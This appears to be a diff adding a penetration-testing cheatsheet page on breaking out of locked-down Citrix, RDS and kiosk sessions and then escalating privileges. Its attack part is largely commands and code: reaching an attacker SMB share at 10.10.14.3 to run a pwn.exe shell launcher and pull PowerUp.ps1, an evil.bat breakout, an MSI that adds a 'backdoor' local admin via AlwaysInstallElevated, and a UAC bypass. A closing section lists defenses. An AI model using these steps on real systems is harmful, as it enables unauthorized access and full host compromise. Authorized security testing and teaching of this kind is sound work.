@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Restricted Environment Breakout · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Restricted Environment Breakout</h1><p class="cx-lede">Escaping a locked-down published-desktop or kiosk environment (Citrix, RDS/Terminal Services, AWS AppStream, CyberArk PSM) to a real command prompt - the dialog-box-to-command-execution methodology, UNC path tricks past File Explorer group policy, launching binaries from an SMB share, alternate file/registry editors, shortcut and script-execution tricks, then escalating from the shell you win with AlwaysInstallElevated and a UAC bypass.</p><div class="cx-tags"><span class="cx-tag">MITRE T1068, T1078</span><span class="cx-tag">D3FEND D3-EAL, D3-PSA</span><span class="cx-tag">IMPACT PrivEsc, SystemCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Published-application and kiosk platforms (Citrix, RDS/Terminal Services, AWS AppStream, CyberArk PSM) hand users a single app or a locked desktop - no <code>cmd</code>, no <code>powershell</code>, File Explorer and <code>regedit</code> restricted by GPO. The breakout is a three-step methodology: <strong>get a dialog box → turn it into command execution → escalate</strong>. Almost any app feature that opens a file picker (Open/Save/Print/Help/Browse) is the way in.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. In any app, open a file dialog (Paint → File → Open), set type = All Files, then:
+C:\users\&lt;you&gt;                   # type the local path directly - bypasses File Explorer folder GPO
+\\127.0.0.1\c$\users\&lt;you&gt;        # same via loopback UNC - but c$ needs local admin
+\\10.10.14.3\share               # reach an attacker SMB share (authenticated smbserver.py)
+
+# 2. Right-click a dropped .exe → Open  (pwn.exe = system(&quot;cmd.exe&quot;))  → real shell
+#    or: modify a shortcut&#x27;s Target to cmd.exe; or drop evil.bat containing &quot;cmd&quot;
+
+# 3. From the shell, escalate like any host
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre></figure>
+<p>Success indicator: an interactive <code>cmd.exe</code>/<code>powershell.exe</code> running outside the published app - from there the host is enumerable and escalation proceeds normally.</p>
+<h2 id="when-this-applies">When this applies</h2>
+<p>The target isn't SYSTEM yet - it's a <em>shell at all</em>. You're dropped into one Citrix-published app or a kiosk desktop where the lock-down (GPO, no Start-menu shells, blocked <code>C:\</code>, disabled <code>regedit</code>) is the obstacle. Breaking out to a command prompt is the milestone; standard privilege escalation follows once you have it.</p>
+<p>The whole approach rests on one observation: <strong>lock-downs usually restrict the obvious paths (Start menu, File Explorer, regedit) but leave the apps themselves able to touch the filesystem.</strong> Any Open/Save As/Import/Export/Browse/Help/Print/Scan feature can summon a native Windows dialog box, and that dialog ignores much of the shell GPO.</p>
+<h2 id="step-1-get-a-dialog-box">Step 1 - get a dialog box</h2>
+<p>Launch any available app with a file feature and open its picker. MS Paint is the canonical example (<code>File → Open</code>), but Notepad, WordPad, the print dialog, or an app's "attach/import" button all work. Once the dialog is open you have a minimal file browser that runs with fewer restrictions than Explorer.</p>
+<h2 id="step-2-dialog-box-to-command-execution">Step 2 - dialog box to command execution</h2>
+<p>Several routes from the open dialog to a real shell - try them in roughly this order.</p>
+<h3 id="unc-paths-past-file-explorer-gpo">UNC paths past File Explorer GPO</h3>
+<p>Folder-browsing GPO that blocks <code>C:\Users</code> in Explorer typically doesn't block <strong>UNC paths</strong> typed into a dialog's <em>File name</em> field. Set the file-type filter to <strong>All Files (*.*)</strong> and enter:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>C:\users\pmorgan                      # direct local path - no SMB, no special rights
+\\127.0.0.1\c$\users\pmorgan          # loopback UNC variant</code></pre></figure>
+<p>The dialog navigates there, giving you a view of the filesystem Explorer refused. Prefer typing the <strong>local path</strong> directly - it needs no privileges. The <code>c$</code> administrative share only works if your session account has <strong>local admin</strong> rights (ordinary kiosk users can't reach <code>c$</code>); when you lack that, use the local path or a share you can actually read.</p>
+<h3 id="launch-a-binary-from-an-smb-share">Launch a binary from an SMB share</h3>
+<p>The dialog reaches remote UNC paths too, so stage tools on an attacker SMB share rather than fighting file-copy restrictions. Start a server - use an <strong>authenticated</strong> share, because modern Windows blocks insecure <em>guest</em> SMB logons by default (a bare guest share won't mount):</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">smbserver.py -smb2support -user pwn -password pwn share $(pwd)   # impacket, authenticated
+# then from the session:  net use \\10.10.14.3\share /user:pwn pwn</code></pre></figure>
+<p>In the dialog, browse to <code>\\10.10.14.3\share</code> (All Files). You often can't <em>copy</em> out (Explorer restrictions), but you can <strong>right-click an executable → Open</strong> to run it in place. A tiny custom binary that just shells out gets you a prompt when <code>cmd.exe</code> is merely <em>hidden</em> (no Start-menu entry, Explorer blocked) rather than blocked by name:</p>
+<figure class="cx-code"><figcaption>c</figcaption><pre><code class="language-c">// pwn.c  →  compile to pwn.exe
+#include &lt;stdlib.h&gt;
+int main() { system(&quot;C:\\Windows\\System32\\cmd.exe&quot;); }</code></pre></figure>
+<p>Right-click <code>pwn.exe</code> → Open → a Command Prompt appears. Note the limit: <code>system()</code> itself invokes the command interpreter, so this <strong>doesn't</strong> defeat an allowlisting policy (AppLocker/WDAC) that blocks <code>cmd.exe</code> <em>execution</em> - there <code>pwn.exe</code> fails too. It only helps where the shell is hidden/undiscoverable but launching executables is still permitted. If share access is flaky, <code>xcopy \\10.10.14.3\share\PowerUp.ps1 .\</code> pulls files once you have any shell.</p>
+<h3 id="alternate-file-and-registry-editors">Alternate file and registry editors</h3>
+<p>When File Explorer itself is the thing locked down, portable third-party editors ignore the Explorer-specific GPO:</p>
+<ul>
+<li><strong><a href="https://explorerplusplus.com/">Explorer++</a></strong> or <strong>Q-Dir</strong> - portable file managers that browse and copy where Explorer won't (no install needed; run from the share).</li>
+<li><strong>SimpleRegEdit / UberRegEdit / SmallRegistryEditor</strong> - GUI registry editors that work when <code>regedit</code> is blocked by policy.</li>
+</ul>
+<h3 id="modify-an-existing-shortcut">Modify an existing shortcut</h3>
+<p>A <code>.lnk</code> you can write to is editable: right-click → <strong>Properties</strong> → set <strong>Target</strong> to <code>C:\Windows\System32\cmd.exe</code> (or a script) → run it. Watch the ACL, though - published shortcuts under the <strong>shared</strong> Start menu (<code>C:\ProgramData\Microsoft\Windows\Start Menu</code>) are usually <strong>not</strong> writable by kiosk users, so editing those fails. Use one in a user-writable location (your Desktop / profile), copy a shortcut there first, or generate a fresh malicious <code>.lnk</code> with PowerShell.</p>
+<h3 id="script-auto-execution">Script auto-execution</h3>
+<p>If <code>.bat</code> / <code>.vbs</code> / <code>.ps1</code> are associated with their interpreters, a dropped script runs when <strong>launched from the shell</strong> (Explorer, a portable file manager, the Desktop) via its association. The minimal breakout is a one-line <code>evil.bat</code>:</p>
+<figure class="cx-code"><figcaption>bat</figcaption><pre><code class="language-bat">cmd</code></pre></figure>
+<p>Launching it (double-click <strong>in Explorer/Explorer++</strong>, or right-click → Open) spawns an interactive Command Prompt. Note: <strong>double-clicking inside an application's Open dialog won't run it</strong> - the dialog submits the file to the app (Paint would try to open <code>evil.bat</code> as an image). From a file picker, use the right-click → <strong>Open</strong> context action instead, which invokes the shell association.</p>
+<h2 id="step-3-escalate-from-the-shell">Step 3 - escalate from the shell</h2>
+<p>Once you have <code>cmd</code>/<code>powershell</code>, the lock-down is behind you and normal escalation applies - run winPEAS or PowerUp and work the findings. In these environments <strong>AlwaysInstallElevated</strong> is a common win:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre></figure>
+<p>If set, PowerUp's <code>Write-UserAddMSI</code> generates an MSI that adds a local admin; run it, then switch to the new account:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">Import-Module .\PowerUp.ps1
+Write-UserAddMSI        # creates UserAdd.msi → prompts to add e.g. backdoor:T3st@123 to Administrators</code></pre></figure>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">runas /user:backdoor cmd</code></pre></figure>
+<p>See <a href="../misc-techniques/index.html#alwaysinstallelevated">misc techniques</a> for the AlwaysInstallElevated mechanics and the direct <code>msfvenom</code> MSI variant.</p>
+<h3 id="bypassing-uac">Bypassing UAC</h3>
+<p>A freshly added admin still holds a <em>filtered</em> token, so <code>C:\Users\Administrator</code> is denied until you elevate. This is the ordinary filtered-admin-token problem - run a UAC bypass (the <code>Bypass-UAC</code> sysprep method is a DLL-hijack of an auto-elevating binary):</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep</code></pre></figure>
+<p>The full treatment - enumeration, the registry-hijack and DLL-hijack families, and why UAC isn't a security boundary - is on the <a href="../uac-bypass/index.html">UAC bypass</a> page.</p>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Don't rely on File Explorer / Start-menu GPO alone - it doesn't constrain dialog boxes, UNC paths, or portable apps. Enforce <strong>application allowlisting (AppLocker / WDAC)</strong> so only approved <em>binaries</em> run, which blocks <code>pwn.exe</code>, Explorer++, and alternate regedit tools. But binary rules don't automatically cover <strong>scripts</strong>: WDAC doesn't directly allowlist <code>.bat</code>/<code>.cmd</code> (an allowed <code>cmd.exe</code> will run them), and AppLocker's Script rule collection must be enforced <em>separately</em>. Turn on script/interpreter control explicitly, or the <code>evil.bat</code> route survives.</li>
+<li>Disable command-line interpreters and script-host associations for kiosk users (<code>cmd</code>, <code>powershell</code>, <code>.bat</code>/<code>.vbs</code>/<code>.ps1</code> auto-run), and block loopback/remote UNC access (<code>\\127.0.0.1\c$</code>, outbound SMB) from the session.</li>
+<li>Remove or lock the published app's file-dialog features where the business case allows; constrain the Save/Open paths.</li>
+<li>Never leave AlwaysInstallElevated set in a published-desktop image, and keep UAC patched and at Always Notify. But don't treat the breakout as harmless without escalation: a shell as the session user already exposes that user's credentials, accessible files, and reachable network resources - contain the breakout itself, not just the escalation that may follow.</li>
+<li>Monitor published-desktop sessions for <code>cmd</code>/<code>powershell</code> spawned from Office/Paint/browser parents and for new local accounts.</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../misc-techniques/index.html#alwaysinstallelevated">Misc techniques</a> - AlwaysInstallElevated and the MSI-to-SYSTEM path used in step 3</li>
+<li><a href="../uac-bypass/index.html">UAC bypass</a> - elevating the filtered admin token the breakout leaves you with</li>
+<li><a href="../credential-hunting/index.html">Credential hunting</a> - what to sweep for once you have a shell in the session</li>
+<li><a href="../initial-enumeration/index.html">Initial enumeration</a> - the enumeration loop that resumes the moment you break out</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../misc-techniques/index.html">Previous: Miscellaneous Techniques</a><a class="cx-next" href="../legacy-systems/index.html">Next: End-of-Life &amp; Legacy Systems</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
